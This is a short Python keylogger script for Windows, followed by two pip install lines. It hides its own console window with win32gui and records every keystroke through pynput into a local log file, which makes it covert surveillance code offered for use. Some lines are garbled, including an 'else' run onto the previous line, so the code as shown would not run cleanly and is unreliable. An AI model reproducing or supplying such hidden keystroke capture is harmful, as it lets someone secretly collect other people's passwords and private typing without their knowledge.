import win32api
import win32console
import win32gui
import pythoncom
from pynput import keyboard
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
def on_press(key):
try:
keylogs = key.char
except AttributeError:
if key == keyboard.Key.enter:
keylogs = '\n' else:
keylogs = str(key)
with open(r'D:\FIS\DS-P9\Keylogger_log.txt', 'a') as f:
f.write(keylogs)
listener = keyboard.Listener(on_press=on_press)
listener.start()
pythoncom.PumpMessages()

pip install pywin32
pip install pyautogui